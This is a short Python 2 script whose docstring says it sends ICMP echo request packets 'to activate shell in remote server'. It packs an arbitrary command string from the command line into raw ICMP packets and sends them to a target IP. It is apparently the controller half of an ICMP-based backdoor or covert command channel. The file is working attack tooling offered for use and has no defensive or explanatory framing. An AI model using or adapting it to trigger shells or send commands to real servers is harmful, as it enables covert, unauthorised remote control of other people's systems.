'''
    Send packet ICMP ECHO REQUEST to activate shell in remote server. 

    Tiago Martins (tiago.tsmweb@gmail.com)
'''

import sys
import socket
import struct
import random

ICMP_ECHO_REQUEST = 8

def checksum(source_string):
    sum = 0
    count_to = (len(source_string) / 2) * 2
    count = 0
    while count < count_to:
        this_val = ord(source_string[count + 1])*256+ord(source_string[count])
        sum = sum + this_val
        sum = sum & 0xffffffff
        count = count + 2
    if count_to < len(source_string):
        sum = sum + ord(source_string[len(source_string) - 1])
        sum = sum & 0xffffffff
    sum = (sum >> 16) + (sum & 0xffff)
    sum = sum + (sum >> 16)
    answer = ~sum
    answer = answer & 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer

def create_packet(data):
    # Header ICMP is type (8), code (8), checksum (16), id (16), sequence (16)
    header = struct.pack("bbHHh", ICMP_ECHO_REQUEST, 0, 0, 1, 1)
    pkt_checksum = checksum(header + data)
    header = struct.pack("bbHHh", ICMP_ECHO_REQUEST, 0, socket.htons(pkt_checksum), 1, 1)
    return header + data

def send_packet(dest_addr, data):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except socket.error as msg:
        print "[!] Socket could not be created. Error Code : " + str(msg[0]) + " Message " + msg[1]
        sys.exit(1)
  
    packet = create_packet(data)

    while packet:
        sent = sock.sendto(packet, (dest_addr, 1))
        packet = packet[sent:]
        print "[>] Sent %d bytes to %s" % (sent, str(dest_addr))
        print

    sock.close()       

if __name__ == "__main__":
    if len(sys.argv) < 3:
        msg = "[!] python icmp_send_cmd.py <destination IP address> <cmd>\n"
        sys.stderr.write(msg)
        sys.exit(1)

    send_packet(sys.argv[1], sys.argv[2])
